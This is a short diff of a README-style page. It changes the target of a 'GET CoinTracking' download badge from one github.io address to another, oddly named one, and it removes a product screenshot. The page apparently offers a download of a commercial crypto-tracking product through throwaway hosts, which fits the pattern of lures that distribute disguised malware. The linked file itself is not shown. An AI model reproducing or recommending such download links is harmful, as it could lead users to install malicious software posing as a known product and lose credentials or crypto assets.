@@ -7,7 +7,7 @@
 <br>
 
 <div align="center">  
-<a href="https://install-quick-software.github.io/.github/cointracking">  
+<a href="https://tubus-jubus-apps.github.io/.github/cointracking">  
 <img src="https://img.shields.io/badge/💻_GET_CoinTracking-purple?style=for-the-badge&logo=apple" alt="GET CoinTracking">  
 </a>  
 </div>
@@ -22,8 +22,6 @@
 ---
 
 <div align="center">  
-<img src="https://camo.githubusercontent.com/b2a3cd89347c4ea8b931d215ead1fc0ebe0384cdfc158ce83aacf5f050fabd9a/68747470733a2f2f626974636f696e2d32676f2e64652f636f6e74656e742f696d616765732f323032332f30392f436f696e547261636b696e672d44617368626f6172642e77656270" width="1080"/>  
-</div>
 
 <br>
 
